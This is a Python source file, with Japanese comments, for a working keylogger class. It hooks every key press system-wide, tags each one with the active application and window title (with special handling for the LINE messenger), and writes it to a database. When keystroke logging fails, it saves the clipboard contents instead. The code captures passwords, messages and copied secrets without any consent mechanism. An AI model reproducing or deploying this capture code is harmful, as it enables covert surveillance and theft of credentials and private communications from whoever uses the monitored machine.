import pygetwindow as gw
import psutil
from pynput import keyboard
from src.database import session
from src.database.models.key_logger.application_log import ApplicationLog
from pywinauto import handleprops
import pyperclip


class KeyLogger:
    @staticmethod
    def get_active_window_info():
        active_window = gw.getActiveWindow()
        if active_window:
            return active_window.title, active_window.topleft
        return "Unknown", (0, 0)

    @staticmethod
    def get_active_application():
        active_window = gw.getActiveWindow()
        if active_window and active_window._hWnd:
            try:
                # ウィンドウハンドルからPIDを取得
                pid = handleprops.pid_from_handle(active_window._hWnd)
                process = psutil.Process(pid)

                # プロセス名とウィンドウタイトルを取得
                application_name = process.name()
                window_title = active_window.title

                # 追加の処理で、特定のアプリケーションに対応
                if "LINE" in window_title:
                    application_name = "LINE"

                return application_name, window_title

            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, Exception) as e:
                print(f"Error retrieving process info: {e}")
                return "Unknown", "Unknown"
        return "Unknown", "Unknown"

    @staticmethod
    def log_key_press(key):
        try:
            key_char = key.char  # 通常のキーを取得
        except AttributeError:
            key_char = str(key)  # 特殊キー（Shift、Ctrlなど）を文字列に変換

        # 特殊キーの処理
        if len(key_char) > 1:
            # 例: Shift, Ctrl, Altなどのキーを適切に処理
            key_char = f"[{key_char}]"

        application_name, window_title = KeyLogger.get_active_application()
        print("key_char", key_char)
        # アプリケーションログをデータベースに保存
        log_entry = ApplicationLog(
            application_name=application_name,
            window_title=window_title,
            input_text=key_char,
            context="General Input"  # 入力コンテキストを指定
        )
        session.add(log_entry)
        session.commit()
        print(f"Logged: {key_char} in {application_name} - {window_title}")

    @staticmethod
    def on_press(key):
        try:
            KeyLogger.log_key_press(key)
        except Exception as e:
            print(f"Error logging key press: {e}")
            # フォールバックとして、クリップボードの内容を取得して保存
            try:
                clipboard_text = pyperclip.paste()
                application_name, window_title = KeyLogger.get_active_application()
                log_entry = ApplicationLog(
                    application_name=application_name,
                    window_title=window_title,
                    input_text=clipboard_text,
                    context="Clipboard Fallback"
                )
                session.add(log_entry)
                session.commit()
                print(f"Logged from clipboard: {clipboard_text}")
            except Exception as fallback_error:
                print(f"Fallback logging failed: {fallback_error}")

    @classmethod
    def start(cls):
        listener = keyboard.Listener(on_press=cls.on_press)
        listener.start()
        return listener  # リスナーオブジェクトを返すことで、後で停止が可能
